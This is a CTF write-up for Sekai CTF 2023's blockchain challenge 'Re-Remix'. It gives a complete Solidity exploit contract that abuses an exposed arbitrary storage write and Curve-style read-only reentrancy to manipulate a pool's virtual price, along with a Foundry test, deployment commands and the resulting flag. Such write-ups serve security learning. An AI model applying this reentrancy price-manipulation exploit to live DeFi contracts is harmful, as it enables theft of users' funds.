# Sekai CTF 2023 - [Blockchain] Re-Remix [9 solves / 493 points]

### Description  
```  
Hmm, it seems a bit difficult for this song to make a high-level chart uwu

How about using a remixed version instead? ✪v✪

Author: Y4nhu1  
```

Our goal is to make level >= 30, we can do that by controlling the value of
`sampleEditor.region_tempo()` and `equalizer.getGlobalInfo()`

```solidity  
   function getSongLevel() public view returns (uint256) {  
       return convert(ud(sampleEditor.region_tempo() * 1e18).log2()) * _getComplexity(equalizer.getGlobalInfo());  // log2(tempo) * complexity  
   }

   function finish() external {  
       uint256 level = getSongLevel();  
       if (level < 30)  
           revert TooEasy(level);  
       emit FlagCaptured();  
   }  
```

For `equalizer.getGlobalInfo()`, it wil get the complexity of it :

```solidity  
   function _getComplexity(uint256 n) internal pure returns (uint256 c) {  
       bytes memory s = bytes(Strings.toString(n));  
       bool[] memory v = new bool[](10);  
       for (uint i; i < s.length; ++i) {  
           v[uint8(s[i]) - 48] = true;  
       }  
       for (uint i; i < 10; ++i) {  
           if (v[i]) ++c;  
       }  
   }  
```

It just check how many different digits it has, the initial value is
`1000000000000000000` which has only 1 and 0, so it returns 2

Equalizer is just the curve stable swap amm with functions renamed, and
`getGlobalInfo()` is `getVirtualPrice()` which can be manipulated easily with
the read only reentrancy in `remove_liquidity()` which is renamed to
`decreaseVolume()`

https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/

For `sampleEditor.region_tempo()`, the initial value is 60

```solidity  
   function setTempo(uint256 _tempo) external {  
       if (_tempo > 233) revert OvO();  
       project_tempo = _tempo;  
   }

   function adjust() external {  
       if (!tracks["Rhythmic"][2].settings.flexOn)  
           revert QaQ();  
       region_tempo = project_tempo;  
   }

   function updateSettings(uint256 p, uint256 v) external {  
       if (p <= 39) revert OvO();  
       assembly {  
           sstore(p, v)  
       }  
   }  
```

We can increase it up to 233, by first settnig `project_tempo` to 233, then
set `tracks["Rhythmic"][2].settings.flexOn` to true by calling
`updateSettings()` to the correct storage slot, then call `adjust()`

We can calculate the storage slot for the Region struct in
`tracks["Rhythmic"][0]` with this :  
```  
»  keccak256(abi.encodePacked(keccak256(abi.encodePacked("Rhythmic",
uint256(2)))))  
0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb  
```

Then just see how the struct is packed

```solidity  
   enum Align { None, Bars, BarsAndBeats }

   struct Settings {  
       Align align;  
       bool flexOn;  
   }

   struct Region {  
       Settings settings;  
       bytes data;  
   }  
```

So, we can just set the storage slot of
`0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4` to
the maximum value, and `tracks["Rhythmic"][2].settings.flexOn` will be true

The Equalizer is a curve stable swap amm with 3 tokens : native ETH, INST and
VOCAL, and it has 100 ether of all 3 tokens initially

There's a function in MusicRemixer that mint 1 ether of INST and VOCAL tokens
for us :

```solidity  
   function getMaterial(bytes memory redemptionCode) external {  
       if (usedRedemptionCode[redemptionCode])  
           revert CodeRedeemed();  
       bytes32 hash = ECDSA.toEthSignedMessageHash(abi.encodePacked("Music Remixer Pro Material"));  
       if (ECDSA.recover(hash, redemptionCode) != SIGNER)  
           revert InvalidCode();  
  
       usedRedemptionCode[redemptionCode] = true;

       FreqBand(equalizer.bands(1)).mint(msg.sender, 1 ether);  
       FreqBand(equalizer.bands(2)).mint(msg.sender, 1 ether);  
   }  
```

But we need a valid signature from this signer :

```solidity  
   address constant private SIGNER =
0x886A1C4798d270902E490b488C4431F8870bCDE3;  
```

In the constructor, it set this invalid signature as used :

```solidity  
       uint8 v = 28;  
       bytes32 r = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";  
       bytes32 s = hex"1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE1337";  
       usedRedemptionCode[abi.encodePacked(r, s, v)] = true;  
```

If, we try to do ecrecover with this invalid signature, we will get the signer
address

It is using the openzeppelin ECDSA library, which checks for signature
malleability and signature length, so we can't bypass the signature check to
mint tokens there

But we have 1 ether, and we can just swap it to those tokens in the Equalizer
with the `equalize()` function which is just the swap function

Then we can just do the curve read only reentrancy

### Exploit contract :

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.19;

import "../src/MusicRemixer.sol";

contract reremixExploit {  
   MusicRemixer public musicRemixer;  
   SampleEditor public sampleEditor;  
   Equalizer public equalizer;  
   FreqBand public inst;  
   FreqBand public vocal;

   constructor(address _musicRemixer) payable {  
       require(msg.value == 0.5 ether, "not 0.5 ether");  
       musicRemixer = MusicRemixer(_musicRemixer);  
       sampleEditor = musicRemixer.sampleEditor();  
       equalizer = musicRemixer.equalizer();  
       inst = FreqBand(equalizer.bands(1));  
       vocal = FreqBand(equalizer.bands(2));  
   }

   function start() public {  
       sampleEditor.setTempo(233);  
       sampleEditor.updateSettings(0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4, type(uint256).max);  
       sampleEditor.adjust();  
       equalizer.equalize{value: 0.11 ether}(0, 1, 0.11 ether);  
       equalizer.equalize{value: 0.11 ether}(0, 2, 0.11 ether);  
       uint256[3] memory amounts = [uint(0.1 ether), uint(0.1 ether), uint(0.1 ether)];  
       inst.approve(address(equalizer), amounts[1]);  
       vocal.approve(address(equalizer), amounts[2]);  
       uint256 lpAmount = equalizer.increaseVolume{value: 0.1 ether}(amounts);  
       equalizer.decreaseVolume(lpAmount);  
   }  
  
   receive() external payable {  
       musicRemixer.finish();  
   }  
}  
```

### Foundry test :

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.19;

import "forge-std/Test.sol";  
import "../src/MusicRemixer.sol";  
import "../src/Exploit.sol";

contract reremixTest is Test {  
   MusicRemixer public musicRemixer;  
  
   event FlagCaptured();

   function setUp() public {  
       musicRemixer = new MusicRemixer{value: 100 ether}();  
   }

   function testExploitContract() public {  
       reremixExploit exploit = new reremixExploit{value: 0.5 ether}(address(musicRemixer));  
       vm.expectEmit(false, false, false, false);  
       emit FlagCaptured();  
       exploit.start();  
   }  
}  
```

```  
# forge test --match-path test/testContract.t.sol -vv  
[⠔] Compiling...  
No files changed, compilation skipped

Running 1 test for test/testContract.t.sol:reremixTest  
[PASS] testExploitContract() (gas: 807283)  
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.26ms  
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)  
```

Then we can just deploy and run it on the actual instance

```  
# forge create src/Exploit.sol:reremixExploit -r http://re-remix-
web.chals.sekai.team/466bc2d6-b9d9-4476-bb21-03c32eee41c4 --private-key
0x026f98e50658ddbbbd422e4af9162d09258db3d0fbeb37fe042d29c33a6f5047
--constructor-args 0xE8f4f13814dB4e0A4789Ac42ca8fbfd0627bD2B0 --value
500000000000000000  
[⠒] Compiling...  
No files changed, compilation skipped  
Deployer: 0x43a7DDDdD656352f7d3e4F06296BC58Ee140F0dd  
Deployed to: 0xdCaDE2F1aB61DE7aAB29f148c6425e883B87a613  
Transaction hash:
0x8206f22c2a4cc663ae67bef96805e6d974616c793f4b69c6a4c0f1effab6ab10

# cast send 0xdCaDE2F1aB61DE7aAB29f148c6425e883B87a613 "start()" -r http://re-
remix-web.chals.sekai.team/466bc2d6-b9d9-4476-bb21-03c32eee41c4 --private-key
0x026f98e50658ddbbbd422e4af9162d09258db3d0fbeb37fe042d29c33a6f5047  
```

```  
# nc chals.sekai.team 5000  
1 - launch new instance  
2 - kill instance  
3 - get flag  
action? 3  
uuid please: 466bc2d6-b9d9-4476-bb21-03c32eee41c4  
tx hash that emitted FlagCaptured event please:
0x2ca74fbc32394f2e04674217c4865ce2b416936c6945c6b70de30bfd153de3eb

Congratulations! <3  
SEKAI{T0o_H4rd_4_M3_2_p1aY_uwu_13ack_7o_Exp3rt_l3v3l}  
```

Original writeup (https://github.com/Kaiziron/sekai-
ctf-2023-writeup/blob/main/re-remix.md).